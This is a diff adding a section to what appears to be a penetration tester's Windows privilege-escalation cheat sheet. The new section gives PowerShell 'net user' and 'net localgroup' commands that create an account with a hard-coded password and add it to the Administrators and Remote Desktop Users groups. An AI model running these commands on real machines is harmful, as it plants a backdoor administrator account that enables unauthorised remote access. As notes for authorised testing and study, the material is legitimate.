@@ -129,3 +129,13 @@ schtasks /query /fo LIST /v
 ---
 # Windows Privilege Escalation — Token Impersonation (SeImpersonatePrivilege)
 - https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070
+---
+# Windows Add User Command
+```powershell
+#To create a user named api with a password of Dork123!
+net user api Dork123! /add
+
+#To add to the administrator and RDP groups
+net localgroup Administrators api /add
+net localgroup 'Remote Desktop Users' api /add
+```
